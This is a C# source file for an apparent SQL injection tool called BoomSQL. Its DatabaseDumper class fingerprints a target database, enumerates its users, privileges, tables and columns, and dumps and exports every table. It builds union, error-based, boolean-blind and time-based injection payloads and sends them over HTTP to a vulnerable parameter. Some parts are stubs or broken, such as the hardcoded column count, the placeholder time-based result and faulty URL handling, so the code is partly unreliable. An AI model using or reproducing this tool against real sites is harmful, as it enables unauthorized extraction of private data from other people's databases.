using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.IO;
using System.Text.Json;

namespace BoomSQL.Core
{
    public class DatabaseDumper
    {
        private readonly HttpClient _httpClient;
        private readonly VulnerabilityDetails _vulnerability;
        private readonly SqlInjectionConfig _config;
        private readonly DatabaseStructure _database;

        public DatabaseDumper(HttpClient httpClient, VulnerabilityDetails vulnerability, SqlInjectionConfig config)
        {
            _httpClient = httpClient;
            _vulnerability = vulnerability;
            _config = config;
            _database = new DatabaseStructure();
        }

        public async Task<DatabaseStructure> DumpDatabaseAsync(CancellationToken cancellationToken = default)
        {
            try
            {
                // Step 1: Fingerprint database
                await FingerprintDatabaseAsync(cancellationToken);

                // Step 2: Get current user and privileges
                await GetCurrentUserAsync(cancellationToken);

                // Step 3: Enumerate databases
                await EnumerateDatabasesAsync(cancellationToken);

                // Step 4: Enumerate tables
                await EnumerateTablesAsync(cancellationToken);

                // Step 5: Enumerate columns
                await EnumerateColumnsAsync(cancellationToken);

                // Step 6: Extract data
                await ExtractDataAsync(cancellationToken);

                return _database;
            }
            catch (Exception ex)
            {
                throw new Exception($"Database dumping failed: {ex.Message}", ex);
            }
        }

        private async Task FingerprintDatabaseAsync(CancellationToken cancellationToken)
        {
            var fingerprintQueries = new Dictionary<string, string>
            {
                { "mysql", "SELECT VERSION()" },
                { "mssql", "SELECT @@VERSION" },
                { "oracle", "SELECT banner FROM v$version WHERE rownum=1" },
                { "postgresql", "SELECT version()" },
                { "sqlite", "SELECT sqlite_version()" }
            };

            foreach (var query in fingerprintQueries)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                try
                {
                    var result = await ExecuteQueryAsync(query.Value, cancellationToken);
                    if (!string.IsNullOrEmpty(result))
                    {
                        _database.DatabaseType = query.Key;
                        _database.Version = result;
                        break;
                    }
                }
                catch
                {
                    // Continue to next database type
                }
            }

            // Fallback to detected database type from vulnerability
            if (string.IsNullOrEmpty(_database.DatabaseType))
            {
                _database.DatabaseType = _vulnerability.DatabaseType;
            }
        }

        private async Task GetCurrentUserAsync(CancellationToken cancellationToken)
        {
            var userQueries = new Dictionary<string, string>
            {
                { "mysql", "SELECT USER()" },
                { "mssql", "SELECT SYSTEM_USER" },
                { "oracle", "SELECT USER FROM dual" },
                { "postgresql", "SELECT current_user" },
                { "sqlite", "SELECT 'sqlite' as user" }
            };

            if (userQueries.ContainsKey(_database.DatabaseType))
            {
                var query = userQueries[_database.DatabaseType];
                var result = await ExecuteQueryAsync(query, cancellationToken);
                _database.CurrentUser = result ?? "unknown";
            }

            // Get privileges
            await GetPrivilegesAsync(cancellationToken);
        }

        private async Task GetPrivilegesAsync(CancellationToken cancellationToken)
        {
            var privilegeQueries = new Dictionary<string, string>
            {
                { "mysql", "SHOW GRANTS" },
                { "mssql", "SELECT * FROM fn_my_permissions(NULL, 'DATABASE')" },
                { "oracle", "SELECT * FROM session_privs" },
                { "postgresql", "SELECT * FROM information_schema.table_privileges WHERE grantee = current_user" }
            };

            if (privilegeQueries.ContainsKey(_database.DatabaseType))
            {
                var query = privilegeQueries[_database.DatabaseType];
                var result = await ExecuteQueryAsync(query, cancellationToken);
                if (!string.IsNullOrEmpty(result))
                {
                    _database.Privileges = ParsePrivileges(result);
                }
            }
        }

        private async Task EnumerateDatabasesAsync(CancellationToken cancellationToken)
        {
            var databaseQueries = new Dictionary<string, string>
            {
                { "mysql", "SELECT schema_name FROM information_schema.schemata" },
                { "mssql", "SELECT name FROM sys.databases" },
                { "oracle", "SELECT username FROM all_users" },
                { "postgresql", "SELECT datname FROM pg_database" },
                { "sqlite", "SELECT name FROM sqlite_master WHERE type='table'" }
            };

            if (databaseQueries.ContainsKey(_database.DatabaseType))
            {
                var query = databaseQueries[_database.DatabaseType];
                var result = await ExecuteQueryAsync(query, cancellationToken);
                if (!string.IsNullOrEmpty(result))
                {
                    var databases = ParseDatabaseNames(result);
                    // For simplicity, we'll work with the first database
                    if (databases.Any())
                    {
                        _database.DatabaseName = databases.First();
                    }
                }
            }
        }

        private async Task EnumerateTablesAsync(CancellationToken cancellationToken)
        {
            var tableQueries = new Dictionary<string, string>
            {
                { "mysql", "SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()" },
                { "mssql", "SELECT table_name FROM information_schema.tables" },
                { "oracle", "SELECT table_name FROM user_tables" },
                { "postgresql", "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'" },
                { "sqlite", "SELECT name FROM sqlite_master WHERE type='table'" }
            };

            if (tableQueries.ContainsKey(_database.DatabaseType))
            {
                var query = tableQueries[_database.DatabaseType];
                var result = await ExecuteQueryAsync(query, cancellationToken);
                if (!string.IsNullOrEmpty(result))
                {
                    var tableNames = ParseTableNames(result);
                    foreach (var tableName in tableNames)
                    {
                        if (cancellationToken.IsCancellationRequested)
                            break;

                        var table = new DatabaseTable
                        {
                            Name = tableName,
                            Schema = _database.DatabaseName
                        };

                        _database.Tables.Add(table);
                    }
                }
            }
        }

        private async Task EnumerateColumnsAsync(CancellationToken cancellationToken)
        {
            var columnQueries = new Dictionary<string, string>
            {
                { "mysql", "SELECT column_name, data_type, is_nullable FROM information_schema.columns WHERE table_name = '{0}'" },
                { "mssql", "SELECT column_name, data_type, is_nullable FROM information_schema.columns WHERE table_name = '{0}'" },
                { "oracle", "SELECT column_name, data_type, nullable FROM user_tab_columns WHERE table_name = '{0}'" },
                { "postgresql", "SELECT column_name, data_type, is_nullable FROM information_schema.columns WHERE table_name = '{0}'" },
                { "sqlite", "PRAGMA table_info('{0}')" }
            };

            if (columnQueries.ContainsKey(_database.DatabaseType))
            {
                var queryTemplate = columnQueries[_database.DatabaseType];

                foreach (var table in _database.Tables)
                {
                    if (cancellationToken.IsCancellationRequested)
                        break;

                    var query = string.Format(queryTemplate, table.Name);
                    var result = await ExecuteQueryAsync(query, cancellationToken);
                    if (!string.IsNullOrEmpty(result))
                    {
                        table.Columns = ParseColumns(result, _database.DatabaseType);
                    }
                }
            }
        }

        private async Task ExtractDataAsync(CancellationToken cancellationToken)
        {
            foreach (var table in _database.Tables)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                try
                {
                    // Get row count first
                    var countQuery = $"SELECT COUNT(*) FROM {table.Name}";
                    var countResult = await ExecuteQueryAsync(countQuery, cancellationToken);
                    if (int.TryParse(countResult, out int rowCount))
                    {
                        table.RowCount = rowCount;
                    }

                    // Extract data with pagination
                    var extractedData = await ExtractTableDataAsync(table, cancellationToken);
                    table.Data = extractedData;
                }
                catch (Exception ex)
                {
                    // Log error but continue with other tables
                    Console.WriteLine($"Error extracting data from table {table.Name}: {ex.Message}");
                }
            }
        }

        private async Task<List<Dictionary<string, object>>> ExtractTableDataAsync(DatabaseTable table, CancellationToken cancellationToken)
        {
            var data = new List<Dictionary<string, object>>();
            var pageSize = 100;
            var currentPage = 0;

            while (true)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                var query = BuildPaginatedQuery(table, currentPage, pageSize);
                var result = await ExecuteQueryAsync(query, cancellationToken);
                
                if (string.IsNullOrEmpty(result))
                    break;

                var pageData = ParseTableData(result, table.Columns);
                if (pageData.Count == 0)
                    break;

                data.AddRange(pageData);
                currentPage++;

                // Prevent infinite loops
                if (currentPage > 1000)
                    break;
            }

            return data;
        }

        private string BuildPaginatedQuery(DatabaseTable table, int page, int pageSize)
        {
            var columnNames = string.Join(", ", table.Columns.Select(c => c.Name));
            var offset = page * pageSize;

            return _database.DatabaseType switch
            {
                "mysql" => $"SELECT {columnNames} FROM {table.Name} LIMIT {pageSize} OFFSET {offset}",
                "mssql" => $"SELECT {columnNames} FROM {table.Name} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT {pageSize} ROWS ONLY",
                "oracle" => $"SELECT {columnNames} FROM (SELECT {columnNames}, ROWNUM rn FROM {table.Name}) WHERE rn > {offset} AND rn <= {offset + pageSize}",
                "postgresql" => $"SELECT {columnNames} FROM {table.Name} LIMIT {pageSize} OFFSET {offset}",
                "sqlite" => $"SELECT {columnNames} FROM {table.Name} LIMIT {pageSize} OFFSET {offset}",
                _ => $"SELECT {columnNames} FROM {table.Name}"
            };
        }

        private async Task<string> ExecuteQueryAsync(string query, CancellationToken cancellationToken)
        {
            try
            {
                // Build the injection payload with the query
                var injectionPayload = BuildInjectionPayload(query);
                
                // Create the request URL
                var testUrl = ApplyPayloadToUrl(_vulnerability.InjectionPoint, injectionPayload);
                
                // Execute the request
                var response = await _httpClient.GetAsync(testUrl, cancellationToken);
                var responseText = await response.Content.ReadAsStringAsync();
                
                // Extract the result from the response
                var result = ExtractQueryResult(responseText, query);
                
                return result;
            }
            catch (Exception ex)
            {
                throw new Exception($"Query execution failed: {ex.Message}", ex);
            }
        }

        private string BuildInjectionPayload(string query)
        {
            // Build appropriate payload based on vulnerability type
            return _vulnerability.VulnerabilityType switch
            {
                "Union-based SQL Injection" => BuildUnionPayload(query),
                "Error-based SQL Injection" => BuildErrorPayload(query),
                "Boolean-based Blind SQL Injection" => BuildBooleanPayload(query),
                "Time-based Blind SQL Injection" => BuildTimePayload(query),
                _ => BuildGenericPayload(query)
            };
        }

        private string BuildUnionPayload(string query)
        {
            // Determine number of columns (simplified)
            var columnCount = DetermineColumnCount();
            var unionColumns = new List<string>();
            
            for (int i = 0; i < columnCount; i++)
            {
                unionColumns.Add(i == 1 ? $"({query})" : "NULL");
            }
            
            return $"' UNION SELECT {string.Join(", ", unionColumns)} --";
        }

        private string BuildErrorPayload(string query)
        {
            return _database.DatabaseType switch
            {
                "mysql" => $"' AND ExtractValue(1, concat(0x7e, ({query}), 0x7e)) --",
                "mssql" => $"' AND CONVERT(INT, ({query})) --",
                "oracle" => $"' AND UTL_INADDR.get_host_name(({query})) IS NULL --",
                "postgresql" => $"' AND CAST(({query}) AS INT) --",
                _ => $"' AND ({query}) --"
            };
        }

        private string BuildBooleanPayload(string query)
        {
            return $"' AND ASCII(SUBSTRING(({query}), 1, 1)) > 0 --";
        }

        private string BuildTimePayload(string query)
        {
            return _database.DatabaseType switch
            {
                "mysql" => $"' AND IF(LENGTH(({query})) > 0, sleep(1), 0) --",
                "mssql" => $"'; IF LENGTH(({query})) > 0 WAITFOR DELAY '0:0:1' --",
                "postgresql" => $"' AND (SELECT pg_sleep(1) WHERE LENGTH(({query})) > 0) --",
                _ => $"' AND ({query}) --"
            };
        }

        private string BuildGenericPayload(string query)
        {
            return $"' AND ({query}) --";
        }

        private string ApplyPayloadToUrl(InjectionPoint injectionPoint, string payload)
        {
            // Apply payload to the vulnerable parameter
            var baseUrl = _vulnerability.Payload.PayloadString.Replace(_vulnerability.Payload.PayloadString, payload);
            return baseUrl;
        }

        private int DetermineColumnCount()
        {
            // Simplified column count determination
            // In a real implementation, this would use ORDER BY or UNION techniques
            return 3; // Default assumption
        }

        private string ExtractQueryResult(string response, string query)
        {
            // Extract result based on injection type
            return _vulnerability.VulnerabilityType switch
            {
                "Union-based SQL Injection" => ExtractUnionResult(response),
                "Error-based SQL Injection" => ExtractErrorResult(response),
                "Boolean-based Blind SQL Injection" => ExtractBooleanResult(response),
                "Time-based Blind SQL Injection" => ExtractTimeResult(response),
                _ => ExtractGenericResult(response)
            };
        }

        private string ExtractUnionResult(string response)
        {
            // Extract data from union-based injection response
            var match = Regex.Match(response, @"([A-Za-z0-9\.\-_]+\s*[\w\s\.\-_]*)", RegexOptions.IgnoreCase);
            return match.Success ? match.Value.Trim() : "";
        }

        private string ExtractErrorResult(string response)
        {
            // Extract data from error-based injection response
            var patterns = new[]
            {
                @"~([^~]+)~", // MySQL ExtractValue
                @"'([^']+)'", // General quoted strings
                @":\s*(.+)", // After colon
                @"Error:\s*(.+)" // After Error:
            };

            foreach (var pattern in patterns)
            {
                var match = Regex.Match(response, pattern, RegexOptions.IgnoreCase);
                if (match.Success)
                {
                    return match.Groups[1].Value.Trim();
                }
            }

            return "";
        }

        private string ExtractBooleanResult(string response)
        {
            // For boolean-based, this would require character-by-character extraction
            // Simplified for this implementation
            return response.Contains("true") || response.Contains("success") ? "1" : "0";
        }

        private string ExtractTimeResult(string response)
        {
            // For time-based, this would require timing analysis
            // Simplified for this implementation
            return "time_based_result";
        }

        private string ExtractGenericResult(string response)
        {
            // Generic result extraction
            return response.Length > 0 ? response.Substring(0, Math.Min(100, response.Length)) : "";
        }

        private List<string> ParsePrivileges(string result)
        {
            var privileges = new List<string>();
            var lines = result.Split('\n');
            
            foreach (var line in lines)
            {
                if (!string.IsNullOrWhiteSpace(line))
                {
                    privileges.Add(line.Trim());
                }
            }
            
            return privileges;
        }

        private List<string> ParseDatabaseNames(string result)
        {
            var databases = new List<string>();
            var lines = result.Split('\n');
            
            foreach (var line in lines)
            {
                if (!string.IsNullOrWhiteSpace(line))
                {
                    databases.Add(line.Trim());
                }
            }
            
            return databases;
        }

        private List<string> ParseTableNames(string result)
        {
            var tables = new List<string>();
            var lines = result.Split('\n');
            
            foreach (var line in lines)
            {
                if (!string.IsNullOrWhiteSpace(line))
                {
                    tables.Add(line.Trim());
                }
            }
            
            return tables;
        }

        private List<DatabaseColumn> ParseColumns(string result, string databaseType)
        {
            var columns = new List<DatabaseColumn>();
            var lines = result.Split('\n');
            
            foreach (var line in lines)
            {
                if (!string.IsNullOrWhiteSpace(line))
                {
                    var parts = line.Split('\t');
                    if (parts.Length >= 3)
                    {
                        columns.Add(new DatabaseColumn
                        {
                            Name = parts[0].Trim(),
                            DataType = parts[1].Trim(),
                            IsNullable = parts[2].Trim().ToLower() == "yes" || parts[2].Trim().ToLower() == "true"
                        });
                    }
                }
            }
            
            return columns;
        }

        private List<Dictionary<string, object>> ParseTableData(string result, List<DatabaseColumn> columns)
        {
            var data = new List<Dictionary<string, object>>();
            var lines = result.Split('\n');
            
            foreach (var line in lines)
            {
                if (!string.IsNullOrWhiteSpace(line))
                {
                    var parts = line.Split('\t');
                    var row = new Dictionary<string, object>();
                    
                    for (int i = 0; i < Math.Min(parts.Length, columns.Count); i++)
                    {
                        var column = columns[i];
                        var value = parts[i].Trim();
                        
                        // Convert value based on data type
                        row[column.Name] = ConvertValue(value, column.DataType);
                    }
                    
                    data.Add(row);
                }
            }
            
            return data;
        }

        private object ConvertValue(string value, string dataType)
        {
            if (string.IsNullOrEmpty(value) || value.ToLower() == "null")
                return null;

            return dataType.ToLower() switch
            {
                "int" or "integer" or "bigint" => int.TryParse(value, out int intVal) ? intVal : value,
                "float" or "real" or "double" => double.TryParse(value, out double doubleVal) ? doubleVal : value,
                "decimal" or "numeric" => decimal.TryParse(value, out decimal decimalVal) ? decimalVal : value,
                "bool" or "boolean" => bool.TryParse(value, out bool boolVal) ? boolVal : value,
                "date" or "datetime" or "timestamp" => DateTime.TryParse(value, out DateTime dateVal) ? dateVal : value,
                _ => value
            };
        }

        public async Task<DumpResult> DumpTableAsync(string tableName, CancellationToken cancellationToken = default)
        {
            var result = new DumpResult
            {
                TableName = tableName
            };

            try
            {
                var table = _database.Tables.FirstOrDefault(t => t.Name == tableName);
                if (table == null)
                {
                    result.Errors.Add($"Table {tableName} not found");
                    return result;
                }

                var startTime = DateTime.UtcNow;
                var data = await ExtractTableDataAsync(table, cancellationToken);
                result.DumpDuration = DateTime.UtcNow - startTime;

                result.Data = data;
                result.ExtractedRows = data.Count;
                result.TotalRows = table.RowCount;
                result.IsComplete = result.ExtractedRows == result.TotalRows;

                return result;
            }
            catch (Exception ex)
            {
                result.Errors.Add(ex.Message);
                return result;
            }
        }

        public async Task<string> ExportDataAsync(string format, string filePath, CancellationToken cancellationToken = default)
        {
            try
            {
                return format.ToLower() switch
                {
                    "json" => await ExportToJsonAsync(filePath, cancellationToken),
                    "csv" => await ExportToCsvAsync(filePath, cancellationToken),
                    "xml" => await ExportToXmlAsync(filePath, cancellationToken),
                    "sql" => await ExportToSqlAsync(filePath, cancellationToken),
                    _ => throw new ArgumentException($"Unsupported format: {format}")
                };
            }
            catch (Exception ex)
            {
                throw new Exception($"Export failed: {ex.Message}", ex);
            }
        }

        private async Task<string> ExportToJsonAsync(string filePath, CancellationToken cancellationToken)
        {
            var options = new JsonSerializerOptions
            {
                WriteIndented = true,
                PropertyNamingPolicy = JsonNamingPolicy.CamelCase
            };

            var json = JsonSerializer.Serialize(_database, options);
            await File.WriteAllTextAsync(filePath, json, cancellationToken);
            return filePath;
        }

        private async Task<string> ExportToCsvAsync(string filePath, CancellationToken cancellationToken)
        {
            var csv = new StringBuilder();
            
            foreach (var table in _database.Tables)
            {
                csv.AppendLine($"Table: {table.Name}");
                
                if (table.Columns.Any())
                {
                    csv.AppendLine(string.Join(",", table.Columns.Select(c => c.Name)));
                }
                
                foreach (var row in table.Data)
                {
                    var values = table.Columns.Select(c => row.ContainsKey(c.Name) ? row[c.Name]?.ToString() ?? "" : "");
                    csv.AppendLine(string.Join(",", values));
                }
                
                csv.AppendLine();
            }
            
            await File.WriteAllTextAsync(filePath, csv.ToString(), cancellationToken);
            return filePath;
        }

        private async Task<string> ExportToXmlAsync(string filePath, CancellationToken cancellationToken)
        {
            var xml = new StringBuilder();
            xml.AppendLine("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
            xml.AppendLine("<database>");
            
            foreach (var table in _database.Tables)
            {
                xml.AppendLine($"  <table name=\"{table.Name}\">");
                
                foreach (var row in table.Data)
                {
                    xml.AppendLine("    <row>");
                    foreach (var column in table.Columns)
                    {
                        var value = row.ContainsKey(column.Name) ? row[column.Name]?.ToString() ?? "" : "";
                        xml.AppendLine($"      <{column.Name}>{System.Security.SecurityElement.Escape(value)}</{column.Name}>");
                    }
                    xml.AppendLine("    </row>");
                }
                
                xml.AppendLine("  </table>");
            }
            
            xml.AppendLine("</database>");
            
            await File.WriteAllTextAsync(filePath, xml.ToString(), cancellationToken);
            return filePath;
        }

        private async Task<string> ExportToSqlAsync(string filePath, CancellationToken cancellationToken)
        {
            var sql = new StringBuilder();
            
            foreach (var table in _database.Tables)
            {
                // Create table statement
                sql.AppendLine($"CREATE TABLE {table.Name} (");
                var columnDefs = table.Columns.Select(c => $"  {c.Name} {c.DataType}");
                sql.AppendLine(string.Join(",\n", columnDefs));
                sql.AppendLine(");");
                sql.AppendLine();
                
                // Insert statements
                foreach (var row in table.Data)
                {
                    var columns = string.Join(", ", table.Columns.Select(c => c.Name));
                    var values = string.Join(", ", table.Columns.Select(c => 
                    {
                        var value = row.ContainsKey(c.Name) ? row[c.Name] : null;
                        return value == null ? "NULL" : $"'{value.ToString().Replace("'", "''")}'";
                    }));
                    
                    sql.AppendLine($"INSERT INTO {table.Name} ({columns}) VALUES ({values});");
                }
                
                sql.AppendLine();
            }
            
            await File.WriteAllTextAsync(filePath, sql.ToString(), cancellationToken);
            return filePath;
        }
    }
}